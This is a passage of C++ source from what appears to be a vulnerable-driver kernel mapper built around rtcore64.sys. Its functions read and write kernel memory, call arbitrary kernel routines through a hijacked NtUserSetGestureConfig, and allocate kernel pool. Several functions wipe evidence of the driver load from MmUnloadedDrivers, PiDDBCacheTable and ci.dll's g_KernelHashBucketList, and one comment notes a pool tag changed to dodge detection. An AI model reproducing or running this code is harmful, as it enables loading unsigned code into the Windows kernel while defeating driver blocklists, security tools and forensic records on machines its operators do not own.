	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] Failed to find driver name" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}

intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {

	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D

	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			Log(L"[-] Warning PiDDBLock not found" << std::endl);
			return false;
		}
		Log(L"[+] PiDDBLock found with second pattern" << std::endl);
		PiDDBLockPtr += 16; //second pattern offset
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if (PiDDBCacheTablePtr == NULL) {
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		Log(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		Log(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		Log(L"[-] Can't find pattern" << std::endl);
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				return true;
			}
		}
		prev = entry;
		//read next
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}

```

`RTCore64_Vulnerability/intel_driver.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "rtcore64_driver_resource.h"
#include "service.hpp"
#include "utils.hpp"
#include "MemoryAccessor.h"

namespace intel_driver
{
	extern char driver_name[100]; //"rtcore64.sys"
	constexpr DWORD iqvw64e_timestamp = 0x57ee5485;
	extern ULONG64 ntoskrnlAddr;
	extern MemoryAccessor ma;
	extern uintptr_t NtUserSetGestureConfig_ref;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load(bool clean);
	bool Unload(HANDLE device_handle);

	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	/*added by psec*/
	uint64_t MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes);
	uint64_t MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority);
	bool MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect);
	bool MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl);
	bool MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList);
	/**/

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		const HMODULE win32u = GetModuleHandleA("win32u.dll");
		if (win32u == 0) {
			Log(L"[-] Failed to load win32u.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtUserSetGestureConfig = reinterpret_cast<void*>(GetProcAddress(win32u, "NtUserSetGestureConfig"));
		if (!NtUserSetGestureConfig)
		{
